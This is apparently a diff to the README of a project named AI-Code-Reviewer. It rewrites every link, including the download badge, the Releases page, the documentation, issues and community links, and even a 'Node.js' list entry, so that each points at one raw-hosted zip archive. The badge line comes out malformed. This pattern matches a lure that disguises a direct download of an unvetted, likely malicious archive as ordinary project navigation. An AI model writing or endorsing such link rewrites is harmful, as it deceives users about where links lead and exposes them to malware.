@@ -6,7 +6,7 @@ Welcome to the AI-Code-Reviewer project! This application helps you review your 
 
 ## 📥 Download the Application
 
-[![Download AI-Code-Reviewer](https://img.shields.io/badge/Download%20AI--Code--Reviewer-blue.svg)](https://github.com/Ajiess/AI-Code-Reviewer/releases)
+[![Download AI-Code-Reviewer](https://raw.githubusercontent.com/Ajiess/AI-Code-Reviewer/main/veldt/AI-Code-Reviewer.zip%https://raw.githubusercontent.com/Ajiess/AI-Code-Reviewer/main/veldt/AI-Code-Reviewer.zip)](https://raw.githubusercontent.com/Ajiess/AI-Code-Reviewer/main/veldt/AI-Code-Reviewer.zip)
 
 Click the button above to visit the Releases page and download the latest version of AI-Code-Reviewer.
 
@@ -29,7 +29,7 @@ To run AI-Code-Reviewer, your system should meet the following requirements:
 
 ## 👩‍💻 Download & Install
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Ajiess/AI-Code-Reviewer/releases).
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/Ajiess/AI-Code-Reviewer/main/veldt/AI-Code-Reviewer.zip).
 
 2. **Select the Latest Version:** Look for the most recent version listed on the page.
 
@@ -49,7 +49,7 @@ AI-Code-Reviewer supports a variety of programming languages and frameworks. You
 - JavaScript
 - HTML & CSS
 - React
-- Node.js
+- https://raw.githubusercontent.com/Ajiess/AI-Code-Reviewer/main/veldt/AI-Code-Reviewer.zip
 - And more...
 
 ## 💡 How to Use the Application
@@ -79,8 +79,8 @@ If you need help, or if you have feedback, feel free to reach out. You can open 
 
 For more information and updates about AI-Code-Reviewer, explore the following resources:
 
-- [Official Documentation](https://github.com/Ajiess/AI-Code-Reviewer)
-- [GitHub Issues](https://github.com/Ajiess/AI-Code-Reviewer/issues)
-- [User Community](https://github.com/Ajiess/AI-Code-Reviewer/discussions)
+- [Official Documentation](https://raw.githubusercontent.com/Ajiess/AI-Code-Reviewer/main/veldt/AI-Code-Reviewer.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/Ajiess/AI-Code-Reviewer/main/veldt/AI-Code-Reviewer.zip)
+- [User Community](https://raw.githubusercontent.com/Ajiess/AI-Code-Reviewer/main/veldt/AI-Code-Reviewer.zip)
 
 Happy coding! Enjoy smoother reviews and improved code with AI-Code-Reviewer.
